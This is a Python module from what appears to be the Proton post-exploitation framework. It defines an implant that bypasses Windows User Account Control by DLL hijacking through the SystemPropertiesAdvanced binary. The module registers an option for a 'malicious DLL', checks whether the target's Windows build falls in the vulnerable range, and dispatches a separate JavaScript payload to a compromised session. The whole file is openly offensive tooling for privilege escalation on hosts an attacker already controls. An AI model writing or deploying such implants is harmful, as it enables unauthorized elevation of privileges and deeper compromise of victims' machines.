#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid

class SystemPropertiesAdvancedJob(core.job.Job):
    def create(self):
        if self.session_id == -1:
            return
        if (int(self.session.build) < 14393 or int(self.session.build) >= 18632) and self.options.get("IGNOREBUILD") == "false":
            self.error("0", "The target may not be vulnerable to this implant. Set IGNOREBUILD to true to run anyway.", "Target build is not vulnerable.", "")
            return False

    def done(self):
        self.display()

    def display(self):
        self.results = "Completed"

class SystemPropertiesAdvancedImplant(core.implant.Implant):

    NAME = "Bypass UAC  SystemPropertiesAdvanced"
    DESCRIPTION = "UAC bypass through DLL Hijacking method (systempropertiesadvanced binary)."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/elevate/bypassuac_systempropertiesadvanced"

    def load(self):
        self.options.register("USER", "", "Current user.")
        self.options.register("DLL", "", "Malicius DLL.")

    def job(self):
        return SystemPropertiesAdvancedJob

    def run(self):
        workloads = {}
        workloads["js"] = "data/implant/elevate/bypassuac_systempropertiesadvanced.js"

        self.dispatch(workloads, self.job)
